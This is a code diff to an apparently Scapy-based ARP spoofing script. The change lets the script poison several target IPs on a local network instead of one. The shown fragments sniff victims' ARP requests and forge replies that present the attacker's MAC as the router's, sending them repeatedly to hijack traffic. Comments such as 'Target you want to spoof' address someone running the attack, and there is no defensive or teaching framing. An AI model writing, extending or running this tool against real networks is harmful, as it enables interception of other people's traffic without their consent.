@@ -5,7 +5,7 @@ from datetime import datetime
 
 routerIp = "192.168.1.1" # IP address of the router
 routerMac = "5c:e0:c5:d6:45:5c" # MAC of your PC
-targetIp = "192.168.1.8" # Target you want to spoof, leave as an empty string if you want to spoof all
+targetIps = ["192.168.1.44"] # Target you want to spoof, leave as an empty array if you want to spoof all
 
 def SendContinuosly(packetToVictim, packetToRouter):
     for i in range(5000):
@@ -15,7 +15,7 @@ def SendContinuosly(packetToVictim, packetToRouter):
 
 def HandlePacket(pkt):
     victimIp = pkt[ARP].psrc
-    if victimIp == targetIp or targetIp == "":
+    if victimIp in targetIps or len(targetIps) == 0:
         print("Sniffed a packet from " + pkt.psrc)
         victimMac = pkt[ARP].hwsrc
         etherPkt = Ether(dst=pkt[ARP].hwsrc, src=routerMac)
